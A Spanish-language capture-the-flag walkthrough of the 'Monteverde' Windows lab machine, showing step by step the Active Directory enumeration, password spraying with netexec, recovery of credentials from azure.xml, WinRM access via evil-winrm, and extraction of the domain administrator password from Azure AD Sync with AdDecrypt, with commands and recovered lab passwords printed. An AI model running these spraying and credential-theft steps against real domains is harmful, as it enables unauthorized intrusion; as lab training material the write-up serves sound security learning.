# Monteverde

![](../../../../~gitbook/image.md)Publicado: 21 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
OS: Windows
### 📝 Descripción
Monteverde es una máquina Windows de dificultad media que simula un entorno corporativo con Active Directory. La explotación involucra enumeración exhaustiva de servicios SMB y LDAP para descubrir usuarios válidos, seguido de un ataque de password spraying que revela credenciales débiles. Una vez dentro, se descubren credenciales adicionales en archivos de configuración de Azure AD Connect. La escalada de privilegios se logra aprovechando una vulnerabilidad en Azure AD Sync que permite extraer credenciales del administrador de dominio desde la base de datos local.Esta máquina es excelente para practicar técnicas de enumeración de Active Directory, password spraying, y explotación de servicios de sincronización de Azure.
### 🎯 Puntos Clave
- Enumeración exhaustiva de Active Directory: Uso de herramientas como enum4linux, netexec y windapsearch
- Password Spraying: Aprovechamiento de políticas de contraseñas débiles sin bloqueo de cuentas
- Credenciales en archivos de configuración: Descubrimiento de credenciales en azure.xml
- Azure AD Connect vulnerability: Explotación de AdSyncDecrypt para extraer credenciales de administrador
- Lateral movement: Escalada de privilegios a través de grupos especiales como Azure Admins

### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🚀 Escaneo de puertos

#### 🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
#### 📋 Análisis de Servicios Detectados
PuertoServicioDescripción53DNSSimple DNS Plus88KerberosAutenticación de dominio389/3268LDAPActive Directory LDAP445SMBRecursos compartidos5985WinRMPowerShell Remoting
### 🌐 Enumeración de Servicios

#### 🗂️ 445 SMB
Dado que no tenemos credenciales de cuentas locales ni usuarios de domino, tratamos primero de enumerar el servicio SMB haciendo uso de una sesion nula:Primero probamos con smbclient y aunque logramos autenticarnos de forma anónima no logramos enumerar recursos.Haciendo uso de la herramienta enum4linux tampoco logramos enumerar recursos compartidos aunque sí somos capaces de enumerar usuarios, cuentas de dominio, políticas y grupos:👥 Usuarios enumerados🔐 Política de contraseñas⚠️ Importante: No hay threshold de bloqueo de cuentas, lo que permite password spraying.👑 Grupos de dominio importantesEnumeramos usuarios con netexec en el servicio SMB:![](../../../../~gitbook/image.md)
#### 🗂️ 389 LDAP
Usamos la herramienta netexec para tratar de enumerar usuarios de forma anónima contra ldap:Afinamos un poco el comando para quedarnos con los usuarios y volcarlos a un fichero de texto:![](../../../../~gitbook/image.md)
#### 🎯 Verificación AS-REP Roasting
Verificamos si alguno de los usuarios obtenidos no tiene habilitada la pre-autenticación de kerberos y podemos realizar un ataque de tipo AS-Rep Roasting y obtener su hash, pero no es el caso:
#### 🔍 Enumeración avanzada con Windapsearch
📋 Usuarios del dominioLa salida devuelve algunos usuarios interesantes. SABatchJobs podría ser una cuenta de servicio dedicada a ejecutar trabajos por lotes de , y es quizás inusual por tener un nombre mixto. La presencia de la cuentaAAD_987d7f2f57d2 es un claro indicio de que AD Connect está instalado en el dominio. AD Connect es una herramienta que se utiliza para sincronizar un entorno de Active Directory local con Azure Active Directory.🎯 Grupo Remote Management UsersUsando windapsearch podemos enumerar más grupos de dominio, y ver qué usuarios pertenecen a Remote Management Users . Este grupo permite a sus miembros conectarse a equipos utilizando PowerShell Remoting.Ahora que sabemos que tenemos un usuario que pertenece al Remote Management Users group, podemos intentar realizar password spraying. Tal como descubrimos durante la enumeración del servicio SMB con la herramienta enum4linux, hay una política de contraseñas en la que no hay bloqueo por número de intentos:![](../../../../~gitbook/image.md)Usamos windapsearch para crear una lista de usuario para realizar password spraying:![](../../../../~gitbook/image.md)Resultado importante: `mhope` pertenece al grupo Remote Management Users, lo que significa que puede conectarse vía WinRM.
### 💥 Explotación

#### 🔫 Password Spraying
Creamos lista de usuarios:Descargamos diccionario de contraseñas débiles y añadimos los nombres de usuario:Ejecutamos password spraying:![](../../../../~gitbook/image.md)🎉 Credenciales encontradas: `SABatchJobs:SABatchJobs`
#### 📂 Enumeración de recursos SMB autenticado
![](../../../../~gitbook/image.md)Conectamos al recurso `users$`:En el directorio de `mhope` encontramos `azure.xml`:![](../../../../~gitbook/image.md)🔑 Credenciales adicionales encontradas: `mhope:4n0therD4y@n0th3r$`
#### 🖥️ Acceso inicial vía WinRM
![](../../../../~gitbook/image.md)🏁 Primera flag obtenida: `user.txt`
### ⬆️ Escalada de Privilegios

#### 🔍 Enumeración del sistema
Descubrimos que:- Microsoft Azure AD Sync está instalado
- El usuario `mhope` pertenece al grupo `Azure Admins`
![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🔓 Explotación de Azure AD Sync
Esta combinación presenta una vulnerabilidad que permite extraer credenciales del administrador de dominio.📥 Preparación de herramientasDescargamos AdDecrypt:Subimos `AdDecrypt.exe` y `mcrypt.dll` a la máquina víctima.🎯 Extracción de credencialesNavegamos al directorio de Azure AD Sync:Ejecutamos AdDecrypt:![](../../../../~gitbook/image.md)🎉 Credenciales de administrador obtenidas:
#### 👑 Acceso como administrador
🏆 Flag root obtenida: `root.txt`Last updated 9 months ago- [📝 Descripción](#descripcion)
- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [💥 Explotación](#explotacion)
- [⬆️ Escalada de Privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.10.172
PING 10.10.10.172 (10.10.10.172) 56(84) bytes of data.
64 bytes from 10.10.10.172: icmp_seq=1 ttl=127 time=47.7 ms
64 bytes from 10.10.10.172: icmp_seq=2 ttl=127 time=47.9 ms

--- 10.10.10.172 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 47.675/47.778/47.881/0.103 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.172 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49696
```

```
nmap -sC -sV -p$ports 10.10.10.172 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:09 CEST
Nmap scan report for 10.10.10.172
Host is up (0.046s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-21 10:09:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-time:
|   date: 2025-06-21T10:10:45
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

```
echo "10.10.10.172 megabank.local" | sudo tee -a /etc/hosts
```

```
smbclient -N -L //10.10.10.172
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
enum4linux 10.10.10.172
```

```
=======================================( Users on 10.10.10.172 )=======================================

index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
```

```
============================( Password Policy Information for 10.10.10.172 )============================

[+] Attaching to 10.10.10.172 using a NULL share
[+] Trying protocol 445/SMB...
[+] Found domain(s):
[+] MEGABANK
[+] Builtin

[+] Password Info for Domain: MEGABANK
[+] Minimum password length: 7
[+] Password history length: 24
[+] Maximum password age: 41 days 23 hours 53 minutes
[+] Password Complexity Flags: 000000
[+] Minimum password age: 1 day 4 minutes
[+] Reset Account Lockout Counter: 30 minutes
[+] Locked Account Duration: 30 minutes
[+] Account Lockout Threshold: None
```

```
=======================================( Groups on 10.10.10.172 )=======================================

[+]  Getting domain groups:
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```

```
netexec smb 10.10.10.172 -u '' -p '' --users
```

```
netexec ldap 10.10.10.172 -u '' -p '' --users
```

```
netexec ldap 10.10.10.172 -u '' -p '' --users | grep -E '^\s*LDAP\s+[0-9.]+' | awk '{print $5}' | grep -vE '^\[|\-Username\-|^$' > ldap_users.txt
```

```
impacket-GetNPUsers -dc-ip 10.10.10.172 megabank.local/ -usersfile ldap_users.txt -format hashcat
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[...más usuarios...]
```

```
windapsearch -u "" --dc-ip 10.10.10.172 -U --admin-objects
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.172
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as:
[+]	None

[+] Enumerating all AD users
[+]	Found 10 users:

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL

[+] Attempting to enumerate all admin (protected) objects
[+]	Found 0 Admin Objects:

[*] Bye!
```

```
windapsearch -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.172
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as:
[+]	None

[+] Enumerating all AD users
[+]	Found 10 users:

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL

[+] Attempting to enumerate full DN for group: Remote Management Users
[+]	Using DN: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL

[+]	Found 1 members:

b'CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL'

[*] Bye!
```

```
windapsearch -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt
```

```
windapsearch -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt
```

```
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/refs/heads/master/weak-corporate-passwords/english-basic.txt
cat users.txt >> english-basic.txt
```

```
netexec smb 10.10.10.172 -u users.txt -p english-basic.txt
```

```
netexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --shares
```

```
smbclient -U 'SABatchJobs'  \\\\10.10.10.172\\users$
```

```
smb: \mhope\> get azure.xml
```

```
netexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
```

```
evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$"
Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\mhope\Desktop> dir

Directory: C:\Users\mhope\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/21/2025   3:05 AM             34 user.txt
```

```
wget https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
unzip AdDecrypt.zip
```

```
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
```

```
C:\Temp\AdDecrypt.exe -FullSQL
```

```
Username: administrator
Password: d0m@in4dminyeah!
```

```
evil-winrm -i 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!'
```
